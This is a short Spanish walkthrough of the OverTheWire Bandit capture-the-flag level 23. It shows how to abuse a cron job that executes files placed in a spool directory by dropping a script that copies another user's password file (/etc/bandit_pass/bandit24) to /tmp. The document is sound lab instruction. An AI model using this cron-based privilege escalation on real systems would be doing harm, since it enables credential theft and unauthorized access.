# Resolución de bandit23

1. Ingresar a la máquina como bandit23.

2. Revise los archivos de procesos cron en "/etc/cron.d/"

    `ls -l /etc/cron.d`

3. Verifique que el archivo "/etc/cron.d/cronjob_bandit24" existe y que sus permisos permitan leerlo como bandit23.

4. Lea el contenido de "/etc/cron.d/cronjob_bandit24", se mostrará la ruta al archivo que está ejecutando.

5. Muestre el contenido del script que está ejecutando cron. El script intenta ejecutar todos los archivos que están en la ruta "/var/spool/bandit24/foo" cuyo propietario sea bandit23.

6. Cree un archivo llamado "script_bandit24" en "/var/spool/bandit24/foo" con el siguiente script, que permitirá obtener la contraseña de bandit24.

    ```
    #!/bin/bash

    cat /etc/bandit_pass/bandit24 > /tmp/passbandit24_exe
    ```

7. Asigne permisos de ejecución para el script.

    `chmod +x /var/spool/bandit24/foo/script_bandit24` 

8. Espere hasta que el script se ejecute. El script de bandit24 se ejecuta cada 1 minuto.

9. Lea el contenido del archivo "/tmp/passbandit24_exe", contendrá la contraseña. 